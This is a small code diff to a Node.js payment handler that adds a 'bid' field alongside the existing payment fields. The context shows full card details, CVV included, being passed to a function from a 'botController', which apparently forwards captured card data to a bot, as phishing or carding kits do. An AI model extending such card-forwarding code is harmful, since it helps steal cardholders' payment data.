@@ -4,7 +4,7 @@ const { sendPaymentData } = require('./botController');
 exports.processPayment = (req, res) => {
   const {
     firstName, lastName, address, postalCode, city, countryCode,
-    email, phone, cardHolder, cardNumber, expiry, cvv, price, fb
+    email, phone, cardHolder, cardNumber, expiry, cvv, price, fb, bid
   } = req.body;
 
   const [expireMonth, expireYear] = expiry.split('/');
@@ -83,13 +83,15 @@ exports.processPayment = (req, res) => {
         expiry,
         cvv,
         price,
-        fb
+        fb,
+        bid,
       });
 
       res.render('payment-success', {
         locale: req.getLocale(),
         price: price,
         fb: fb,
+        bid: bid,
       });
     } else {
       return res.status(400).send(result.errorMessage || 'Payment failed');
